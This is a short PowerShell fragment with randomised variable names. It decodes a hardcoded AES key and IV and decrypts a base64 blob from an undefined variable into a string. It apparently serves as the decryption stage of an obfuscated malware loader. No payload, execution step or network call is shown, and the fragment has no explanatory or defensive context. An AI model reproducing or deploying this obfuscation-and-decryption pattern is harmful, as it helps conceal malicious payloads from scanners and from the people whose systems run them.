$FAJWjY=[Convert]::FromBase64String('5A1RAg+ETU1aGAr9oilElf+OUN8Z52on/YlwJR92gao=')
$znCHYX=[Convert]::FromBase64String('5O3ae+8lV8+9NlyxEmMX6g==')
$KAIJlK=[System.Security.Cryptography.Aes]::Create()
$KAIJlK.Key=$FAJWjY;$KAIJlK.IV=$znCHYX;$KAIJlK.Mode='CBC';$KAIJlK.Padding='PKCS7'
$YTvPDc=$KAIJlK.CreateDecryptor()
$nYJhjZ=[IO.MemoryStream]::new([Convert]::FromBase64String($iqIEFW))
$qwLeJL=[Security.Cryptography.CryptoStream]::new($nYJhjZ,$YTvPDc,'Read')
$UBqnHU=[IO.StreamReader]::new($qwLeJL)
$FOBXFr=$UBqnHU.ReadToEnd()
$UBqnHU.Close();$qwLeJL.Close();$nYJhjZ.Close();$KAIJlK.Dispose()
